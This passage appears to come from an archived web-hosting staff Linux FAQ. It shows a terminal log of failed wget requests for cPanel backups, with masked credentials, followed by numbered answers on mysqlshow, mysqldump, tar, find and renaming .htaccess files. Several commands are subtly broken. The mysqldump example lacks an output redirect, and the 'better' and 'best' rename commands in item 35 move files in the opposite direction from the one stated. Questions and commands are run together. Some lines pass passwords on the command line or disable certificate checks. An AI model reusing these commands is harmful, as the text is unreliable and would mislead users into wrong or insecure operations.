swestblu@swest.bluehoststaff.com \[~\]\#
swestblu@swest.bluehoststaff.com \[~\]\# wget http://swestblu:\#\#\#\#\#\#\#@box725.bluehost.com:2082/getsysbackup/daily.tar.gz?restoretype=daily&button=12%2F10%2F2013\[1\] 25044
swestblu@swest.bluehoststaff.com \[~\]\# --2013-12-15 05:54:07-- http://swestblu:\*password\*@box725.bluehost.com:2082/getsysbackup/daily.tar.gz?restoretype=daily
Resolving box725.bluehost.com... 66.147.244.225
Connecting to box725.bluehost.com|66.147.244.225|:2082... connected.
HTTP request sent, awaiting response... 401 Access Denied
Unknown authentication scheme.
Authorization failed.
\[1\]+ Exit 6 wget http://swestblu:\#\#\#\#\#\#\#@box725.bluehost.com:2082/getsysbackup/daily.tar.gz?restoretype=daily
swestblu@swest.bluehoststaff.com \[~\]\#
swestblu@swest.bluehoststaff.com \[~\]\# wget http://swestblu:\#\#\#\#\#\#\#@localhost:2082/getsysbackup/daily.tar.gz?restoretype=daily&button=12%2F10%2F2013\[1\] 5255
--2013-12-15 05:57:10-- http://swestblu:\*password\*@localhost:2082/getsysbackup/daily.tar.gz?restoretype=daily
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:2082... connected.
HTTP request sent, awaiting response... swestblu@swest.bluehoststaff.com \[~\]\# 401 Access Denied
Unknown authentication scheme.
Authorization failed.
\[1\]+ Exit 6 wget http://swestblu:\#\#\#\#\#\#\#@localhost:2082/getsysbackup/daily.tar.gz?restoretype=daily
swestblu@swest.bluehoststaff.com \[~\]\# wget https://swestblu:\#\#\#\#\#\#\#@localhost:2083/getsysbackup/daily.tar.gz?restoretype=daily&button=12%2F10%2F2013\[1\] 5862
swestblu@swest.bluehoststaff.com \[~\]\# --2013-12-15 05:57:19-- https://swestblu:\*password\*@localhost:2083/getsysbackup/daily.tar.gz?restoretype=daily
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:2083... connected.
ERROR: certificate common name \`\*.bluehost.com' doesn't match requested host name \`localhost'.To connect to localhost insecurely, use \`--no-check-certificate'.
\[1\]+ Exit 5 wget https://swestblu:\#\#\#\#\#\#\#@localhost:2083/getsysbackup/daily.tar.gz?restoretype=daily
swestblu@swest.bluehoststaff.com \[~\]\# wget --no-check-certificate https://swestblu:\#\#\#\#\#\#\#@localhost:2083/getsysbackup/daily.tar.gz?restoretype=daily&button=12%2F10%2F2013\[1\] 7395
swestblu@swest.bluehoststaff.com \[~\]\# --2013-12-15 05:57:38-- https://swestblu:\*password\*@localhost:2083/getsysbackup/daily.tar.gz?restoretype=daily
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:2083... connected.
WARNING: certificate common name \`\*.bluehost.com' doesn't match requested host name \`localhost'.
HTTP request sent, awaiting response... 401 Access Denied
Unknown authentication scheme.
Authorization failed.
\[1\]+ Exit 6 wget --no-check-certificate https://swestblu:\#\#\#\#\#\#\#@localhost:2083/getsysbackup/daily.tar.gz?restoretype=daily
swestblu@swest.bluehoststaff.com \[~\]\#
30. What command will output all the databases on the account in a nice tidy list?Use mysqlshow. The following would work well with another script.mysqlshow -u\`whoami\` -p | grep \`whoami\`\_ | awk {'print $2'}
31. How do I export a database?Use mysqldump. For example:mysqldump -u\`whoami\` -p \`whoami\`\_dbname \`whoami\`\_dbname.\`date +%Y%m%d-%H%M%S\`.sql
32. How do I see a list of all active mysql connections for all my databases?Use mysqlshow with mytop.mysqlshow -u\`whoami\` -pPASSWORD | grep \`whoami\`\_ | awk {'print $2'}| xargs -i mytop -u \`whoami\` -pPASSWORD -d {} -b
33. How can I export a single file from a tar archive?It's much like exporting the archive, you just specify which file(s) to the end like this:tar -xvzf archivetoextract.tar.gz filename.sql (needs to be the path listed in the backup)ortar -xvzf archivetoextract.tar.gz \*.sql
34. How can I tell how many files a customer has in their account?This is very useful for the i-nodes being maxed at 50,000 files. This can explain some disk quota errors that don't appear to be disk quota related. Use the 'find' command.find ./ | wc -l
Runs faster, same results as above. Less resource intensivefind2perl | perl | wc -l
Longer, but more accurate...find ./ -printf %i'\\n'| sort -u | wc -l
35. How can I rename all my .htaccess files to .htaccess.bak?Most resource intensivefind ./ -name .htaccess -exec mv {}{}.bak \\;Generates lots of processesfind .htaccess | awk '{print "mv",$1,$1".bak"}'| sh
betterfind .htaccess | xargs -I {} mv {}.bak {};bestfind2perl .htaccess | perl | xargs -I {} mv {}.bak {};
36. How do I rename all my .htaccess.bak files back to .htaccess?Most resource intensivefind ./ -name .htaccess.bak -execdir mv .htaccess.bak .htaccess \\;Generates lots of processesfind .htaccess.bak |sed s/'.bak'//g | awk '{print "mv "$1".bak" " "$1}'| sh
betterfind .htaccess.bak | sed s/'.bak'//g |xargs -I {} mv {}.bak {};bestfind2perl .htaccess.bak | perl | sed s/".bak"/""/g |xargs -I {} mv {}.bak {};

Additional Resources:

[http://ols.fedoraproject.org/OLS/Reprints-2008/kumar-reprint.pdf][13]

[http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials][14]

[0]: https://web.archive.org/web/20150320081207/http://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard
[1]: https://web.archive.org/web/20150320081207/http://www.linuxhowtos.org/Tips%20and%20Tricks/chattr.htm
[2]: https://web.archive.org/web/20150320081207/http://www.cyberciti.biz/tips/understanding-unixlinux-file-system-part-i.html
[3]: https://web.archive.org/web/20150320081207/http://en.wikipedia.org/wiki/Subnetwork#IPv4_subnetting
[4]: https://web.archive.org/web/20150320081207/http://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#CIDR_notation
[5]: https://web.archive.org/web/20150320081207/http://danceswithkittens.com/books/LPIC/
[6]: https://web.archive.org/web/20150320081207/http://www.cs.rutgers.edu/~pxk/416/notes/07-scheduling.html
[7]: https://web.archive.org/web/20150320081207/https://wiki.bluehost.com/index.php/Linux_challenge
[8]: https://web.archive.org/web/20150320081207/https://wiki.bluehost.com/index.php/Linux_challenge_answers
[9]: https://web.archive.org/web/20150320081207/http://scripts.v2joecr.com/file-folder-fixer.txt
[10]: https://web.archive.org/web/20150320081207/http://stackoverflow.com/questions/4272770/wget-with-authentication
[11]: https://web.archive.org/web/20150320081207/http://74.220.207.132:2082/
[12]: https://web.archive.org/web/20150320081207/http://
[13]: https://web.archive.org/web/20150320081207/http://ols.fedoraproject.org/OLS/Reprints-2008/kumar-reprint.pdf
[14]: https://web.archive.org/web/20150320081207/http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials